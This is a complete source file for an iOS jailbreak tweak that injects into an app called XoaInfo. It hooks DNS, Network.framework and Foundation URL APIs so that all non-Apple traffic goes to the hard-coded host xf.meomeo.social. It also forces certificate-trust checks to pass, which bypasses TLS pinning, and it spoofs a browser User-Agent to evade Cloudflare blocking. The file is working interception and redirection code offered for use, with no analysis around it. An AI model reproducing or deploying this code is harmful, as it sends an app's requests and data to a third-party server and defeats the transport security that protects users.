// ==============================================================================
// XoaInfo C2 Redirect Tweak for RootHide / Dopamine
// Redirects ALL outbound non-Apple traffic in XoaInfo to xf.meomeo.social
// ==============================================================================

#pragma clang diagnostic ignored "-Weverything"

#ifndef NULL
#define NULL ((void*)0)
#endif

#ifndef nil
#define nil ((id)0)
#endif

typedef unsigned long size_t;
typedef signed long   ssize_t;
typedef unsigned int  uint32_t;
typedef unsigned char uint8_t;
typedef int           int32_t;
typedef long          intptr_t;
typedef unsigned long uintptr_t;
typedef long          dispatch_once_t;

// C library declarations
extern const char *getprogname(void);
extern size_t  strlen(const char *s);
extern int     strcmp(const char *s1, const char *s2);
extern int     strncmp(const char *s1, const char *s2, size_t n);
extern char   *strstr(const char *haystack, const char *needle);
extern char   *strcasestr(const char *haystack, const char *needle);
extern char   *strcpy(char *dest, const char *src);
extern char   *strncpy(char *dest, const char *src, size_t n);
extern int     snprintf(char *str, size_t size, const char *fmt, ...);
extern ssize_t write(int fd, const void *buf, size_t count);
extern int     open(const char *pathname, int flags, ...);
extern int     close(int fd);
extern void   *dlsym(void *handle, const char *symbol);
extern void   *dlopen(const char *filename, int flag);
extern void    syslog(int priority, const char *format, ...);
extern void    dispatch_once(dispatch_once_t *predicate, void (^block)(void));

// ObjC runtime types & functions
typedef struct objc_class  *Class;
typedef struct objc_object { Class isa; } *id;
typedef struct objc_selector *SEL;
typedef id (*IMP)(id, SEL, ...);
typedef struct objc_method_t *Method;

extern Class  objc_getClass(const char *name);
extern Class  object_getClass(id obj);
extern SEL    sel_registerName(const char *str);
extern Method class_getInstanceMethod(Class cls, SEL name);
extern Method class_getClassMethod(Class cls, SEL name);
extern IMP    method_getImplementation(Method m);
extern void   method_setImplementation(Method m, IMP imp);
extern id     objc_msgSend(id self, SEL op, ...);

// Target configuration
static const char REDIRECT_HOST[] = "xf.meomeo.social";
static const char DEFAULT_UA[] = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148";

// Safe syslog logging (Guaranteed to appear in idevicesyslog)
static void c2log_raw(const char *msg) {
    if (!msg) return;
    write(2, msg, strlen(msg));
    write(2, "\n", 1);
    syslog(5 /* LOG_NOTICE */, "%s", msg);
}

static void c2log(const char *fmt, const char *arg1, const char *arg2) {
    char buf[1024];
    if (arg1 && arg2) {
        snprintf(buf, sizeof(buf), "[C2Redirect] %s: %s -> %s", fmt, arg1, arg2);
    } else if (arg1) {
        snprintf(buf, sizeof(buf), "[C2Redirect] %s: %s", fmt, arg1);
    } else {
        snprintf(buf, sizeof(buf), "[C2Redirect] %s", fmt);
    }
    c2log_raw(buf);
}

// Check if string contains target domains or endpoints (Catch-all for non-Apple)
static int is_c2_target(const char *s) {
    if (!s || strlen(s) == 0) return 0;
    // Don't redirect localhost, Apple, or already redirected host
    if (strstr(s, "127.0.0.1") || strstr(s, "localhost") ||
        strstr(s, "apple.com") || strstr(s, "icloud.com") ||
        strstr(s, "meomeo.social")) {
        return 0;
    }
    return 1;
}

// Strict process check to protect SpringBoard and system daemons
static int is_target_process(void) {
    const char *prog = getprogname();
    if (prog) {
        if (strstr(prog, "SpringBoard") || strstr(prog, "backboardd") || 
            strstr(prog, "runningboardd") || strstr(prog, "locationd") || 
            strstr(prog, "mediaserverd") || strstr(prog, "ReportCrash") ||
            strstr(prog, "osanalyticshelper")) {
            return 0;
        }
    }
    return 1;
}

// ==============================================================================
// Function pointer types for C hooks
// ==============================================================================
struct addrinfo;

typedef void *(*nw_endpoint_create_host_t)(const char *hostname, const char *port);
typedef void  (*sec_protocol_options_set_tls_server_name_t)(void *options, const char *server_name);
typedef void  (*sec_protocol_options_set_verify_block_t)(void *options, void *verify_block, void *verify_queue);
typedef int   (*getaddrinfo_t)(const char *hostname, const char *servname, const struct addrinfo *hints, struct addrinfo **res);
typedef void *(*gethostbyname_t)(const char *name);
typedef int   (*SecTrustEvaluateWithError_t)(void *trust, void **error);
typedef int   (*SecTrustEvaluate_t)(void *trust, int *result);

static nw_endpoint_create_host_t orig_nw_endpoint_create_host = NULL;
static sec_protocol_options_set_tls_server_name_t orig_sec_protocol_options_set_tls_server_name = NULL;
static sec_protocol_options_set_verify_block_t orig_sec_protocol_options_set_verify_block = NULL;
static getaddrinfo_t orig_getaddrinfo = NULL;
static gethostbyname_t orig_gethostbyname = NULL;
static SecTrustEvaluateWithError_t orig_SecTrustEvaluateWithError = NULL;
static SecTrustEvaluate_t orig_SecTrustEvaluate = NULL;

extern void *nw_endpoint_create_host(const char *hostname, const char *port);
extern void  sec_protocol_options_set_tls_server_name(void *options, const char *server_name);
extern void  sec_protocol_options_set_verify_block(void *options, void *verify_block, void *verify_queue);
extern int   getaddrinfo(const char *hostname, const char *servname, const struct addrinfo *hints, struct addrinfo **res);
extern void *gethostbyname(const char *name);
extern int   SecTrustEvaluateWithError(void *trust, void **error);
extern int   SecTrustEvaluate(void *trust, int *result);

// ==============================================================================
// 1. Network.framework Interception
// ==============================================================================
static void *my_nw_endpoint_create_host(const char *hostname, const char *port) {
    if (is_c2_target(hostname)) {
        c2log("nw_endpoint_create_host REDIRECT", hostname, REDIRECT_HOST);
        hostname = REDIRECT_HOST;
    }
    if (orig_nw_endpoint_create_host) {
        return orig_nw_endpoint_create_host(hostname, port);
    }
    return nw_endpoint_create_host(hostname, port);
}

static void my_sec_protocol_options_set_tls_server_name(void *options, const char *server_name) {
    if (is_c2_target(server_name)) {
        c2log("sec_protocol_options_set_tls_server_name REDIRECT", server_name, REDIRECT_HOST);
        server_name = REDIRECT_HOST;
    }
    if (orig_sec_protocol_options_set_tls_server_name) {
        orig_sec_protocol_options_set_tls_server_name(options, server_name);
    } else {
        sec_protocol_options_set_tls_server_name(options, server_name);
    }
}

typedef void (^sec_protocol_verify_complete_t)(int verified);
typedef void (^sec_protocol_verify_t)(void *metadata, void *trust, sec_protocol_verify_complete_t complete);

static void my_sec_protocol_options_set_verify_block(void *options, void *block, void *queue) {
    c2log("sec_protocol_options_set_verify_block (Installing persistent SSL bypass block)", NULL, NULL);
    static sec_protocol_verify_t bypass_block = 0;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        bypass_block = ^(void *metadata, void *trust, sec_protocol_verify_complete_t complete) {
            c2log("SSL verify block executed -> reporting TLS valid (1)", NULL, NULL);
            if (complete) {
                complete(1);
            }
        };
    });
    if (orig_sec_protocol_options_set_verify_block) {
        orig_sec_protocol_options_set_verify_block(options, (__bridge void*)bypass_block, queue);
    } else {
        sec_protocol_options_set_verify_block(options, (__bridge void*)bypass_block, queue);
    }
}

// ==============================================================================
// 2. libSystem DNS & Hostname Interception
// ==============================================================================
static int my_getaddrinfo(const char *hostname, const char *servname, const struct addrinfo *hints, struct addrinfo **res) {
    if (is_c2_target(hostname)) {
        c2log("getaddrinfo REDIRECT", hostname, REDIRECT_HOST);
        hostname = REDIRECT_HOST;
    }
    if (orig_getaddrinfo) {
        return orig_getaddrinfo(hostname, servname, hints, res);
    }
    return getaddrinfo(hostname, servname, hints, res);
}

static void *my_gethostbyname(const char *name) {
    if (is_c2_target(name)) {
        c2log("gethostbyname REDIRECT", name, REDIRECT_HOST);
        name = REDIRECT_HOST;
    }
    if (orig_gethostbyname) {
        return orig_gethostbyname(name);
    }
    return gethostbyname(name);
}

// ==============================================================================
// 3. Security.framework SSL Pinning Bypass
// ==============================================================================
static int my_SecTrustEvaluateWithError(void *trust, void **error) {
    c2log("SecTrustEvaluateWithError bypassed -> returning 1", NULL, NULL);
    if (error) *error = (void*)0;
    return 1;
}

static int my_SecTrustEvaluate(void *trust, int *result) {
    c2log("SecTrustEvaluate bypassed -> returning 0 / Proceed", NULL, NULL);
    if (result) *result = 1; // kSecTrustResultProceed
    return 0; // errSecSuccess
}

// ==============================================================================
// 4. ObjC URL Redirection
// ==============================================================================
static id redirectURLString(id urlStr) {
    if (!urlStr) return urlStr;
    Class nss = objc_getClass("NSString");
    Class nsu = objc_getClass("NSURL");
    if (!nss || !nsu) return urlStr;

    const char *orig_c = ((const char*(*)(id,SEL))objc_msgSend)(urlStr, sel_registerName("UTF8String"));
    if (!orig_c || strstr(orig_c, REDIRECT_HOST)) return urlStr;
    if (!is_c2_target(orig_c)) return urlStr;

    SEL replSel = sel_registerName("stringByReplacingOccurrencesOfString:withString:");
    id redirStr = ((id(*)(id,SEL,const char*))objc_msgSend)((id)nss, sel_registerName("stringWithUTF8String:"), REDIRECT_HOST);

    // Extract host and replace
    id tempURL = ((id(*)(id,SEL,id))objc_msgSend)((id)nsu, sel_registerName("URLWithString:"), urlStr);
    id currentStr = urlStr;
    if (tempURL) {
        id host = ((id(*)(id,SEL))objc_msgSend)(tempURL, sel_registerName("host"));
        if (host) {
            const char *host_c = ((const char*(*)(id,SEL))objc_msgSend)(host, sel_registerName("UTF8String"));
            if (is_c2_target(host_c)) {
                currentStr = ((id(*)(id,SEL,id,id))objc_msgSend)(urlStr, replSel, host, redirStr);
            }
        }
    }

    const char *new_c = ((const char*(*)(id,SEL))objc_msgSend)(currentStr, sel_registerName("UTF8String"));
    if (new_c && strcmp(orig_c, new_c) != 0) {
        c2log("ObjC URLString Redirected", orig_c, new_c);
    }
    return currentStr;
}

static id redirectURL(id url) {
    if (!url) return url;
    Class nsu = objc_getClass("NSURL");
    if (!nsu) return url;

    id urlStr = ((id(*)(id,SEL))objc_msgSend)(url, sel_registerName("absoluteString"));
    if (!urlStr) return url;

    id newStr = redirectURLString(urlStr);
    if (newStr == urlStr) return url;

    id newURL = ((id(*)(id,SEL,id))objc_msgSend)((id)nsu, sel_registerName("URLWithString:"), newStr);
    return newURL ? newURL : url;
}

static id redirectRequestObj(id req) {
    if (!req) return req;
    id url = ((id(*)(id,SEL))objc_msgSend)(req, sel_registerName("URL"));
    id newURL = redirectURL(url);

    id mreq = ((id(*)(id,SEL))objc_msgSend)(req, sel_registerName("mutableCopy"));
    if (mreq) {
        if (newURL && newURL != url) {
            ((void(*)(id,SEL,id))objc_msgSend)(mreq, sel_registerName("setURL:"), newURL);
        }
        // Inject Browser User-Agent to bypass Cloudflare Error 1010
        Class nss = objc_getClass("NSString");
        if (nss) {
            id uaVal = ((id(*)(id,SEL,const char*))objc_msgSend)((id)nss, sel_registerName("stringWithUTF8String:"), DEFAULT_UA);
            id uaKey = ((id(*)(id,SEL,const char*))objc_msgSend)((id)nss, sel_registerName("stringWithUTF8String:"), "User-Agent");
            if (uaVal && uaKey) {
                ((void(*)(id,SEL,id,id))objc_msgSend)(mreq, sel_registerName("setValue:forHTTPHeaderField:"), uaVal, uaKey);
            }
        }
        return mreq;
    }
    return req;
}

// Saved IMPs
static id (*orig_url_URLWithString)(id, SEL, id);
static id (*orig_url_initWithString)(id, SEL, id);
static id (*orig_req_requestWithURL)(id, SEL, id);
static id (*orig_req_initWithURL)(id, SEL, id);
static id (*orig_req_initWithURLFull)(id, SEL, id, long, double);
static id (*orig_mreq_requestWithURL)(id, SEL, id);
static id (*orig_mreq_initWithURL)(id, SEL, id);
static id (*orig_mreq_initWithURLFull)(id, SEL, id, long, double);
static void (*orig_mreq_setURL)(id, SEL, id);
static id (*orig_sess_dataTaskWithURL)(id, SEL, id);
static id (*orig_sess_dataTaskWithURLCompletion)(id, SEL, id, id);
static id (*orig_sess_dataTaskWithRequest)(id, SEL, id);
static id (*orig_sess_dataTaskWithRequestCompletion)(id, SEL, id, id);
static id (*orig_conn_sendSync)(id, SEL, id, void*, void*);
static id (*orig_conn_initWithRequest)(id, SEL, id, id);

// Hook implementations
static id hook_url_URLWithString(id self, SEL _cmd, id str) {
    return orig_url_URLWithString(self, _cmd, redirectURLString(str));
}

static id hook_url_initWithString(id self, SEL _cmd, id str) {
    return orig_url_initWithString(self, _cmd, redirectURLString(str));
}

static id hook_req_requestWithURL(id self, SEL _cmd, id url) {
    return orig_req_requestWithURL(self, _cmd, redirectURL(url));
}

static id hook_req_initWithURL(id self, SEL _cmd, id url) {
    return orig_req_initWithURL(self, _cmd, redirectURL(url));
}

static id hook_req_initWithURLFull(id self, SEL _cmd, id url, long policy, double timeout) {
    return orig_req_initWithURLFull(self, _cmd, redirectURL(url), policy, timeout);
}

static id hook_mreq_requestWithURL(id self, SEL _cmd, id url) {
    return orig_mreq_requestWithURL(self, _cmd, redirectURL(url));
}

static id hook_mreq_initWithURL(id self, SEL _cmd, id url) {
    return orig_mreq_initWithURL(self, _cmd, redirectURL(url));
}

static id hook_mreq_initWithURLFull(id self, SEL _cmd, id url, long policy, double timeout) {
    return orig_mreq_initWithURLFull(self, _cmd, redirectURL(url), policy, timeout);
}

static void hook_mreq_setURL(id self, SEL _cmd, id url) {
    orig_mreq_setURL(self, _cmd, redirectURL(url));
}

static id hook_sess_dataTaskWithURL(id self, SEL _cmd, id url) {
    return orig_sess_dataTaskWithURL(self, _cmd, redirectURL(url));
}

static id hook_sess_dataTaskWithURLCompletion(id self, SEL _cmd, id url, id block) {
    return orig_sess_dataTaskWithURLCompletion(self, _cmd, redirectURL(url), block);
}

static id hook_sess_dataTaskWithRequest(id self, SEL _cmd, id req) {
    return orig_sess_dataTaskWithRequest(self, _cmd, redirectRequestObj(req));
}

static id hook_sess_dataTaskWithRequestCompletion(id self, SEL _cmd, id req, id block) {
    return orig_sess_dataTaskWithRequestCompletion(self, _cmd, redirectRequestObj(req), block);
}

static id hook_conn_sendSync(id self, SEL _cmd, id req, void *resp, void *err) {
    return orig_conn_sendSync(self, _cmd, redirectRequestObj(req), resp, err);
}

static id hook_conn_initWithRequest(id self, SEL _cmd, id req, id delegate) {
    return orig_conn_initWithRequest(self, _cmd, redirectRequestObj(req), delegate);
}

static void hookMethod(Class cls, const char *selName, IMP newIMP, IMP *origIMP, int isClassMethod) {
    if (!cls) return;
    SEL sel = sel_registerName(selName);
    Method m = isClassMethod ? class_getClassMethod(cls, sel) : class_getInstanceMethod(cls, sel);
    if (!m) return;
    *origIMP = method_getImplementation(m);
    method_setImplementation(m, newIMP);
}

// ==============================================================================
// 5. Dynamic Substrate / ElleKit Function Hook Registration
// ==============================================================================
typedef void (*MSHookFunction_t)(void *symbol, void *hook, void **old);

static void install_dynamic_c_hooks(void) {
    MSHookFunction_t msHook = (MSHookFunction_t)dlsym((void*)-2, "MSHookFunction");
    if (!msHook) {
        msHook = (MSHookFunction_t)dlsym((void*)-2, "DobbyHook");
    }
    if (msHook) {
        c2log("MSHookFunction/DobbyHook found in runtime -> installing dynamic C hooks", NULL, NULL);
        void *fn_nw_host = dlsym((void*)-2, "nw_endpoint_create_host");
        if (fn_nw_host) {
            msHook(fn_nw_host, (void*)my_nw_endpoint_create_host, (void**)&orig_nw_endpoint_create_host);
        }
        void *fn_tls_sni = dlsym((void*)-2, "sec_protocol_options_set_tls_server_name");
        if (fn_tls_sni) {
            msHook(fn_tls_sni, (void*)my_sec_protocol_options_set_tls_server_name, (void**)&orig_sec_protocol_options_set_tls_server_name);
        }
        void *fn_tls_verify = dlsym((void*)-2, "sec_protocol_options_set_verify_block");
        if (fn_tls_verify) {
            msHook(fn_tls_verify, (void*)my_sec_protocol_options_set_verify_block, (void**)&orig_sec_protocol_options_set_verify_block);
        }
        void *fn_gai = dlsym((void*)-2, "getaddrinfo");
        if (fn_gai) {
            msHook(fn_gai, (void*)my_getaddrinfo, (void**)&orig_getaddrinfo);
        }
        void *fn_ghbn = dlsym((void*)-2, "gethostbyname");
        if (fn_ghbn) {
            msHook(fn_ghbn, (void*)my_gethostbyname, (void**)&orig_gethostbyname);
        }
        void *fn_ste = dlsym((void*)-2, "SecTrustEvaluateWithError");
        if (fn_ste) {
            msHook(fn_ste, (void*)my_SecTrustEvaluateWithError, (void**)&orig_SecTrustEvaluateWithError);
        }
        void *fn_ste_old = dlsym((void*)-2, "SecTrustEvaluate");
        if (fn_ste_old) {
            msHook(fn_ste_old, (void*)my_SecTrustEvaluate, (void**)&orig_SecTrustEvaluate);
        }
    }
}

// ==============================================================================
// 6. Constructor (Runs on injection)
// ==============================================================================
__attribute__((constructor))
static void C2RedirectInit(void) {
    if (!is_target_process()) {
        return;
    }

    c2log_raw("=================================================");
    c2log_raw("[C2Redirect] ACTIVE - Initializing hooks for XoaInfo");
    c2log("Redirect target", REDIRECT_HOST, NULL);
    c2log_raw("=================================================");

    // 1. Dynamic function hooks
    install_dynamic_c_hooks();

    // 2. Foundation ObjC Hooks
    Class urlCls  = objc_getClass("NSURL");
    Class reqCls  = objc_getClass("NSURLRequest");
    Class mreqCls = objc_getClass("NSMutableURLRequest");
    Class sessCls = objc_getClass("NSURLSession");
    Class connCls = objc_getClass("NSURLConnection");

    if (urlCls) {
        hookMethod(urlCls, "URLWithString:", (IMP)hook_url_URLWithString, (IMP*)&orig_url_URLWithString, 1);
        hookMethod(urlCls, "initWithString:", (IMP)hook_url_initWithString, (IMP*)&orig_url_initWithString, 0);
    }
    if (reqCls) {
        hookMethod(reqCls, "requestWithURL:", (IMP)hook_req_requestWithURL, (IMP*)&orig_req_requestWithURL, 1);
        hookMethod(reqCls, "initWithURL:", (IMP)hook_req_initWithURL, (IMP*)&orig_req_initWithURL, 0);
        hookMethod(reqCls, "initWithURL:cachePolicy:timeoutInterval:", (IMP)hook_req_initWithURLFull, (IMP*)&orig_req_initWithURLFull, 0);
    }
    if (mreqCls) {
        hookMethod(mreqCls, "requestWithURL:", (IMP)hook_mreq_requestWithURL, (IMP*)&orig_mreq_requestWithURL, 1);
        hookMethod(mreqCls, "initWithURL:", (IMP)hook_mreq_initWithURL, (IMP*)&orig_mreq_initWithURL, 0);
        hookMethod(mreqCls, "initWithURL:cachePolicy:timeoutInterval:", (IMP)hook_mreq_initWithURLFull, (IMP*)&orig_mreq_initWithURLFull, 0);
        hookMethod(mreqCls, "setURL:", (IMP)hook_mreq_setURL, (IMP*)&orig_mreq_setURL, 0);
    }
    if (sessCls) {
        hookMethod(sessCls, "dataTaskWithURL:", (IMP)hook_sess_dataTaskWithURL, (IMP*)&orig_sess_dataTaskWithURL, 0);
        hookMethod(sessCls, "dataTaskWithURL:completionHandler:", (IMP)hook_sess_dataTaskWithURLCompletion, (IMP*)&orig_sess_dataTaskWithURLCompletion, 0);
        hookMethod(sessCls, "dataTaskWithRequest:", (IMP)hook_sess_dataTaskWithRequest, (IMP*)&orig_sess_dataTaskWithRequest, 0);
        hookMethod(sessCls, "dataTaskWithRequest:completionHandler:", (IMP)hook_sess_dataTaskWithRequestCompletion, (IMP*)&orig_sess_dataTaskWithRequestCompletion, 0);
    }
    if (connCls) {
        hookMethod(connCls, "sendSynchronousRequest:returningResponse:error:", (IMP)hook_conn_sendSync, (IMP*)&orig_conn_sendSync, 1);
        hookMethod(connCls, "initWithRequest:delegate:", (IMP)hook_conn_initWithRequest, (IMP*)&orig_conn_initWithRequest, 0);
    }

    c2log_raw("[C2Redirect] All hooks initialized successfully.");
}
